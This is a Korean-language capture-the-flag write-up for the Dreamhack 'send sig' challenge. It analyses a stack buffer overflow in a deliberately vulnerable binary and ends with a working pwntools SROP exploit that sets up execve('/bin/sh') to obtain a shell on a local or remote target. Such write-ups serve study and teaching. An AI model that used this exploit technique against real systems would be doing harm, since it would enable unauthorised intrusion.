# send sig

[문제 링크](https://dreamhack.io/wargame/challenges/145)

## 문제 분석

```sh
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
```

```c
void __noreturn start()
{
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  write(1, "++++++++++++++++++Welcome to dreamhack++++++++++++++++++\n", 0x39u);
  write(1, "+ You can send a signal to dreamhack server.           +\n", 0x39u);
  write(1, "++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n", 0x39u);
  sub_4010B6();
  exit(0);
}
```

```c
ssize_t sub_4010B6()
{
  _BYTE buf[8]; // [rsp+8h] [rbp-8h] BYREF

  write(1, "Signal:", 7u);
  return read(0, buf, 0x400u);
}
```

```c
const char *sub_401090()
{
  return "/bin/sh";
}
```

## 취약점 분석

```c
ssize_t sub_4010B6()
{
  _BYTE buf[8]; // [rsp+8h] [rbp-8h] BYREF

  write(1, "Signal:", 7u);
  return read(0, buf, 0x400u);
}
```

read함수가 1024바이트 만큼 입력받으므로 이를 이용해 버퍼 오버플로우를 일으킬 수 있다.

<br>


ROPgadget을 통해 확인하면 syscall과 pop rax가 모두 있고 SROP을 사용하여 임의 코드를 실행할 수 있다. 

```sh
$ ROPgadget --binary ./send_sig
Gadgets information
============================================================
...
0x00000000004010ae : pop rax ; ret
...
0x00000000004010b0 : syscall
```

`"/bin/sh"`문자열이 프로그램 내에 존재해서 이를 통해 쉘을 획득할 수 있어 보인다.


## 익스플로잇 작성

다음 명령어를 통해 `"/bin/sh"`텍스트가 0x402000가 위치하는것을 알 수 있다.

> PIE 옵션이 꺼져있을 때 기본 주소는 주로 0x400000이다.

``` sh
$ strings -t x ./send_sig | grep bin/sh
   2000 /bin/sh
```

## 익스플로잇

```python
from pwn import *
import sys

context.arch = "amd64"

if len(sys.argv) == 3:
    p = remote(sys.argv[1], sys.argv[2])
else:
    p = process("./send_sig")

e = ELF("./send_sig")
r = ROP(e)

# === Gadget 찾기 ===
pop_rax = r.find_gadget(['pop rax', 'ret'])[0]   # rax에 값을 넣는 gadget
syscall = r.find_gadget(['syscall'])[0]            # syscall 명령어

binsh = 0x402000

# === SigreturnFrame 구성 ===
frame = SigreturnFrame()

# execve("/bin/sh", NULL, NULL) 시스템콜 설정
frame.rax = 0x3b        # execve 시스템콜 번호 (59)
frame.rdi = binsh       # 첫 번째 인자: "/bin/sh" 주소
frame.rsi = 0           # 두 번째 인자: argv = NULL
frame.rdx = 0           # 세 번째 인자: envp = NULL
frame.rip = syscall     # rip를 syscall 주소로 → 시스템콜 실행!

# === 페이로드 구성 ===
payload = b"A" * 16              # buf[8] + saved_rbp[8] 오버플로우
payload += p64(pop_rax)          # (1) rax에 값을 넣기 위해 pop rax 실행
payload += p64(15)               # (2) rax = 15 (sys_rt_sigreturn 번호)
payload += p64(syscall)          # (3) syscall 실행 → sigreturn!
payload += bytes(frame)          # (4) 위조한 SigreturnFrame을 스택에 배치

p.sendlineafter("Signal:", payload)
p.interactive()
```

다음 익스플로잇 코드를 통해 쉘을 획득할 수 있다.